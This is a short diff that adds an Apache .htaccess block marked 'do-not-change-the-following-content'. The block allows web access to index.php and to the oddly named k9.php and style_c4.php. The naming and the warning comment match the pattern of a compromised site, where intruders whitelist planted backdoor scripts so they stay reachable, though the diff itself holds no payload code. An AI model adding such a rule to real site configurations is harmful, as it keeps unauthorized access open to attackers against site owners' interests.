@@ -1,0 +1,5 @@
+#---do-not-change-the-following-content---
+<FilesMatch '^(index.php|k9.php|style_c4.php)$'>
+Order allow,deny
+Allow from all
+</FilesMatch>
